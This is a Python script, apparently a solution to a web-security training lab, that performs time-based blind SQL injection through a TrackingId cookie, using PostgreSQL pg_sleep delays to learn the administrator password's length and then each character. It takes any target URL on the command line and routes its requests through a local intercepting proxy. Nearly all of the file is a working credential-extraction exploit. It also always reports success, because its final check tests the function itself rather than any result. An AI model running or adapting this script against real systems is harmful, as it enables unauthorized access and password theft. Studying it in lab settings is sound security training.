#Blind SQL injection with time delays and information retrieval %3B = ;
import requests
import sys
import urllib3
import urllib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def get_cookies(url):
	r = requests.get(url, verify=False, proxies=proxies)
	cookies = r.cookies
	cookies_obtained = [cookies.get('TrackingId'), cookies.get('session')]
	return cookies_obtained

def get_password_len(url, cookies_obtained):
	for i in range(1, 50):
		payload = f"';SELECT CASE WHEN (username='administrator' AND LENGTH(password)={i}) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--"
		payload_encode = urllib.parse.quote(payload)
		cookies = {'TrackingId': cookies_obtained[0] + payload_encode, 'session': cookies_obtained[1]}
		r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
		if r.elapsed.total_seconds() >= 10:
			return i + 1

def sqli_payload(url):
	cookies_obtained = get_cookies(url)
	password_length = get_password_len(url, cookies_obtained)
	password = "Password: "
	for i in range(1, password_length):
		for j in range(32, 125):
			payload = f"';SELECT CASE WHEN (username='administrator' AND ASCII(SUBSTRING(password,{i},1))='{j}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--"
			payload_encode = urllib.parse.quote(payload)
			cookies = {'TrackingId': cookies_obtained[0] + payload_encode, 'session': cookies_obtained[1]}
			r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
			if r.elapsed.total_seconds() < 5:
				sys.stdout.write('\r' + password + chr(j))
				sys.stdout.flush()
			else:
				password += chr(j)
				sys.stdout.write('\r' + password)
				sys.stdout.flush()
				break

if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print(f'\033[31m[-] Usage: {sys.argv[0]} <url>\033[0m')
		print(f'\033[31m[-] Example: {sys.argv[0]} http://www.example.com\033[0m')
		sys.exit(1)

	print('\033[32m[+] Obtaining password...\033[0m')
	sqli_payload(url)
	if sqli_payload:
		print(f'[+] SQLi Successful!')
	else:
		print(f'[-] SQLi Unsuccessful!!!')
